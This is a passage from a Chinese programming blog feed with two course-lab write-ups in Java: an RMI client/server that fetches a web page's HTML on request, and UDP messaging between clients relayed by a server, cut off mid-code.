      <url>/2023/12/17/Java%E5%88%A9%E7%94%A8RMI%E5%AE%9E%E7%8E%B0http%E8%AF%B7%E6%B1%82%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h1><p>编写Java程序，实现RMI远程调用。客户端指定某个http网站，把这个网址传递给服务器端，服务器端提供http下载服务，通过http get 请求访问http网站，把对应的html文件返回给客户端</p><h1 id="二、实现思路"><a href="#二、实现思路" class="headerlink" title="二、实现思路"></a>二、实现思路</h1><h2 id="1-客户端"><a href="#1-客户端" class="headerlink" title="1. 客户端"></a>1. 客户端</h2><p>在GUI界面输入访问的网址，按下按钮提交请求\<br>监听按钮点击事件，引用远程访问的类，将处理结果反馈到文本框中</p><h2 id="2-服务器端"><a href="#2-服务器端" class="headerlink" title="2. 服务器端"></a>2. 服务器端</h2><p>定义服务接口，需要继承自Remote类\<br>定义实现服务接口的类，在类中编写业务逻辑，需要继承 UnicastRemoteObject 类\<br>在主函数中注册服务</p><h1 id="三、实现过程"><a href="#三、实现过程" class="headerlink" title="三、实现过程"></a>三、实现过程</h1><h2 id="1-客户端-1"><a href="#1-客户端-1" class="headerlink" title="1. 客户端"></a>1. 客户端</h2><p>编写基本的GUI界面(不熟。。要是写前端三件套就好了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">extends</span> <span class="title class_">JFrame</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>(<span class="string">&quot;Client&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RMIClient</span><span class="params">(String <span class="keyword">var</span>)</span>&#123;  </span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">var</span>);  </span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">1000</span>, <span class="number">1500</span>);  </span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;RAMClient&quot;</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="type">JPanel</span> <span class="variable">jp1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JPanel</span>();  </span><br><span class="line">        <span class="type">JLabel</span> <span class="variable">jl1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="string">&quot;Please type the URL you want to visit: &quot;</span>);  </span><br><span class="line">        <span class="type">JTextField</span> <span class="variable">jt1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextField</span>(<span class="number">30</span>);  </span><br><span class="line">        <span class="type">JButton</span> <span class="variable">jb1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JButton</span>(<span class="string">&quot;Confirm&quot;</span>);  </span><br><span class="line">        jp1.add(jl1);  </span><br><span class="line">        jp1.add(jt1);  </span><br><span class="line">        jp1.add(jb1);  </span><br><span class="line"></span><br><span class="line">        <span class="type">JTextArea</span> <span class="variable">jTextArea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JTextArea</span>();  </span><br><span class="line">        jTextArea.setSize(<span class="number">250</span>, <span class="number">1200</span>);  </span><br><span class="line">        jTextArea.setEditable(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">JScrollPane</span> <span class="variable">sp</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">JScrollPane</span>();  </span><br><span class="line">        sp.setViewportView(jTextArea);</span><br></pre></td></tr></table></figure><br>监听JButton事件，将返回数据逐行添加到JTextArea<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">jb1.addActionListener((e)-&gt;&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> jt1.getText();  </span><br><span class="line">    File htmlFile;  </span><br><span class="line">    <span class="comment">// lookup method to find reference  </span></span><br><span class="line">    <span class="keyword">try</span>&#123;  </span><br><span class="line">        <span class="type">DownloadService</span> <span class="variable">access</span> <span class="operator">=</span> (DownloadService) Naming.lookup(<span class="string">&quot;rmi://localhost:1099/download&quot;</span>);  </span><br><span class="line">        htmlFile = access.getHTMLfile(input);  </span><br><span class="line">        <span class="keyword">if</span>(htmlFile != <span class="literal">null</span>)&#123;  </span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(htmlFile));  </span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">            <span class="keyword">while</span>((temp = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;  </span><br><span class="line">                jTextArea.append(temp+<span class="string">&#x27;\n&#x27;</span>);  </span><br><span class="line">                <span class="comment">//System.out.println(temp+&#x27;\n&#x27;);  </span></span><br><span class="line">            &#125;  </span><br><span class="line">            bufferedReader.close();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception err)&#123;  </span><br><span class="line">        err.printStackTrace();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><br>将组件添加到JFrame中并显示<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        <span class="built_in">this</span>.setLayout(<span class="keyword">new</span> <span class="title class_">GridLayout</span>(<span class="number">3</span>, <span class="number">4</span>));  </span><br><span class="line">        <span class="built_in">this</span>.add(jp1);  </span><br><span class="line">        <span class="built_in">this</span>.add(sp);  </span><br><span class="line">        <span class="built_in">this</span>.setVisible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="built_in">this</span>.pack();  </span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="2-服务器端-1"><a href="#2-服务器端-1" class="headerlink" title="2. 服务器端"></a>2. 服务器端</h2><p>定义服务接口DownloadService<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DownloadService</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;  </span><br><span class="line">    File <span class="title function_">getHTMLfile</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>定义实现上述接口的服务类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">DownloadService</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">DownloadServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException&#123;  </span><br><span class="line">        <span class="built_in">super</span>();  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure><br>初始化Http连接对象以及响应文件对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> File <span class="title function_">getHTMLfile</span><span class="params">(String urlStr)</span> <span class="keyword">throws</span> RemoteException, MalformedURLException &#123;  </span><br><span class="line">    <span class="comment">// initialization  </span></span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;result.html&quot;</span>);  </span><br><span class="line">    <span class="type">FileWriter</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">try</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span>(!file.exists())&#123;  </span><br><span class="line">            file.createNewFile();  </span><br><span class="line">        &#125;  </span><br><span class="line">        fileWriter = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file);  </span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">        e.printStackTrace();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br></pre></td></tr></table></figure><br>建立连接，逐行读取返回的HTML响应，保存到文件中<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">        <span class="comment">// create connection  </span></span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(urlStr);  </span><br><span class="line">            conn = (HttpURLConnection) url.openConnection();  </span><br><span class="line">            conn.setRequestMethod(<span class="string">&quot;GET&quot;</span>);  </span><br><span class="line">            conn.setConnectTimeout(<span class="number">12000</span>);  </span><br><span class="line">            conn.connect();  </span><br><span class="line">            System.out.println(<span class="string">&quot;Wait for response&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span>(conn.getResponseCode() == <span class="number">200</span>)&#123;  </span><br><span class="line">                <span class="comment">// if conn success  </span></span><br><span class="line">                inputStream = conn.getInputStream();  </span><br><span class="line">                <span class="keyword">if</span> (inputStream != <span class="literal">null</span>)&#123;  </span><br><span class="line">                    bufferedReader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));  </span><br><span class="line">                    <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">                    <span class="keyword">while</span>((temp = bufferedReader.readLine())!= <span class="literal">null</span>)&#123;  </span><br><span class="line">                        fileWriter.write(temp);  </span><br><span class="line">                        fileWriter.write(<span class="string">&#x27;\n&#x27;</span>);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                    fileWriter.close();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> file;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在主函数中注册服务<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            <span class="type">DownloadService</span> <span class="variable">downloadService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DownloadServiceImpl</span>();  </span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">            Naming.rebind(<span class="string">&quot;rmi://localhost:1099/download&quot;</span>, downloadService);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Server is ready!&quot;</span>);  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="三、运行结果"><a href="#三、运行结果" class="headerlink" title="三、运行结果"></a>三、运行结果</h1><p>启动服务端<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">idea</span> <span class="title">project</span>\<span class="title">javaCourrse</span>\<span class="title">javaEX6</span>\<span class="title">javaEX6</span>\<span class="title">src</span>&gt;<span class="title">java</span> <span class="title">RMIdemo</span>/<span class="title">RMIServer</span></span></span><br><span class="line"><span class="function"><span class="title">Server</span> <span class="title">is</span> <span class="title">ready</span>!</span></span><br></pre></td></tr></table></figure><br>启动客户端<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">idea</span> <span class="title">project</span>\<span class="title">javaCourrse</span>\<span class="title">javaEX6</span>\<span class="title">javaEX6</span>\<span class="title">src</span>&gt;<span class="title">java</span> <span class="title">RMIdemo</span>/<span class="title">RMIClient</span></span></span><br></pre></td></tr></table></figure></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ddf754dff32644dcb632deb737b69fff~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=771&amp;h=371&amp;s=16584&amp;e=png&amp;b=f5f5f5" alt="image.png"><br>输入网址并点击按钮<br><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/fa20d157c3074b199839f6334863ecbb~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=771&amp;h=354&amp;s=24419&amp;e=png&amp;b=f4f4f4" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java利用UDP实现客户端之间通信</title>
      <link href="/2023/12/17/Java%E5%88%A9%E7%94%A8UDP%E5%AE%9E%E7%8E%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/"/>
      <url>/2023/12/17/Java%E5%88%A9%E7%94%A8UDP%E5%AE%9E%E7%8E%B0%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B9%8B%E9%97%B4%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>利用数据报通信方式编写一程序，该程序生成两个客户端，一个服务器端，两个客户端可以相互进行简短的文字交流。</p><h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h1><p>为使客户端能够接收到其他客户端的数据报，客户端在创建时应该<strong>指定端口号</strong>，开启接收数据的线程和等待发送消息的线程，当接收到数据或发送数据后，重启线程。并且发送方在数据报中应包含接收端的地址，由服务器端对地址进行解析并转达数据包。</p><h1 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h1><h2 id="1-服务器端："><a href="#1-服务器端：" class="headerlink" title="1. 服务器端："></a>1. 服务器端：</h2><p>在Server.java中实现Server类，静态变量指定服务器端口，接收数据报的大小</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">serverPort</span> <span class="operator">=</span> <span class="number">8000</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">packetSize</span> <span class="operator">=</span> <span class="number">1024</span>;  </span><br></pre></td></tr></table></figure><p>进入主函数时，初始化数据报套接字及接收数据报</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(serverPort);  </span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[packetSize];  </span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, packetSize);  </span><br><span class="line">        System.out.println(<span class="string">&quot;server is ready!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>使用死循环处理每一个客户端发送的数据报;\<br>将数据报分割为地址及信息两部分;\<br>根据地址及信息创建新数据报，并发送到目标客户端，完成对消息的转述</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;  </span><br><span class="line">    server.receive(packet);  </span><br><span class="line">    System.out.println(<span class="string">&quot;server has received data from sender&quot;</span>);  </span><br><span class="line">    <span class="type">String</span> <span class="variable">dataStr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(data, <span class="number">0</span>, packet.getLength());  </span><br><span class="line">    String[] dataSegments = dataStr.split(<span class="string">&quot; &quot;</span>);  </span><br><span class="line">    <span class="keyword">if</span>(dataSegments.length &gt;= <span class="number">2</span>)&#123;  </span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">receiverAddress</span> <span class="operator">=</span> InetAddress.getByName(dataSegments[<span class="number">0</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>]);  </span><br><span class="line">        <span class="type">int</span> <span class="variable">receiverPort</span> <span class="operator">=</span> Integer.parseInt(dataSegments[<span class="number">0</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>]);  </span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">trulyData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(dataSegments[<span class="number">1</span>].getBytes(),  </span><br><span class="line">        dataSegments[<span class="number">1</span>].length(), receiverAddress, receiverPort);  </span><br><span class="line">        System.out.println(<span class="string">&quot;the message: &quot;</span>+dataSegments[<span class="number">1</span>]);  </span><br><span class="line">        server.send(trulyData);  </span><br><span class="line">        System.out.println(<span class="string">&quot;server has sent data to receiver&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="2-客户端"><a href="#2-客户端" class="headerlink" title="2. 客户端"></a>2. 客户端</h2><p>客户端在创建时需指定端口号，这里使用命令行参数传入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">int</span> port;  </span><br><span class="line">        <span class="keyword">if</span> (args.length &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">            port = Integer.parseInt(args[<span class="number">0</span>]);  </span><br><span class="line">            <span class="type">DatagramSocket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>(port);  </span><br><span class="line">            System.out.println(<span class="string">&quot;client is ready!!&quot;</span>);</span><br></pre></td></tr></table></figure><p>创建接收消息的线程及发送消息的线程等待输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">            <span class="comment">// create a receiver thread  </span></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">receiveThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">ReceiverRunnable</span>(socket));  </span><br><span class="line">            receiveThread.start(); <span class="comment">// receive message at any time  </span></span><br><span class="line">            <span class="comment">// create a sender thread  </span></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">sendThread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">ClientSenderRunnable</span>(socket));  </span><br><span class="line">            sendThread.start();  </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;you must indicate the port by adding argument&quot;</span>);  </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（1）接收消息的线程</p><p>在Receiver.java中实现一个实现Runnable接口的可执行类\<br>在构造方法中传入客户端数据报套接字，初始化接收端\<br>在静态变量中定义数据报大小，以及接收数据报的字符数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ReceiverRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">dataSize</span> <span class="operator">=</span> <span class="number">1024</span>;  </span><br><span class="line">    DatagramPacket receivePacket;  </span><br><span class="line">    <span class="type">byte</span>[] data;  </span><br><span class="line">    <span class="keyword">public</span> DatagramSocket socket;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ReceiverRunnable</span><span class="params">(DatagramSocket socket)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.socket = socket;  </span><br><span class="line">        data = <span class="keyword">new</span> <span class="title class_">byte</span>[dataSize];  </span><br><span class="line">        receivePacket = <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(data, dataSize);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重写run方法，接收数据报并打印消息\<br>在线程终点启动下一个接收消息的线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            socket.receive(receivePacket);  </span><br><span class="line">            System.out.println(<span class="string">&quot;You have received a message: &quot;</span>+<span class="keyword">new</span> <span class="title class_">String</span>(data, dataSize));  </span><br><span class="line">            <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">ReceiverRunnable</span>(socket));  </span><br><span class="line">            thread.start();  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.fillInStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）发送消息的线程</p><p>在ClientSenderRunnable.java中实现一个实现Runnable接口的可执行类\<br>在构造方法中传入客户端数据报套接字，初始化发送端\<br>在静态变量中指定服务器地址及端口，用于初始化数据报</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientSenderRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">serverName</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">serverPort</span> <span class="operator">=</span> <span class="number">8000</span>;  </span><br><span class="line">    <span class="keyword">public</span> DatagramSocket socket;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientSenderRunnable</span><span class="params">(DatagramSocket socket)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.socket = socket;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>重写run方法，读取键盘输入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;  </span><br><span class="line">    System.out.println(<span class="string">&quot;type as (address:port message):&quot;</span>);  </span><br><span class="line">    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">    String dataStr;  </span><br><span class="line">    <span class="keyword">if</span> (scanner.hasNextLine()) &#123;  </span><br><span class="line">        dataStr = scanner.nextLine();  </span><br><span class="line">        System.out.println(<span class="string">&quot;your header and message: &quot;</span> + dataStr);  </span><br><span class="line">        <span class="type">byte</span>[] data = dataStr.getBytes();</span><br></pre></td></tr></table></figure><p>根据静态变量指定的服务端地址打包数据报并发送</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// pack up the 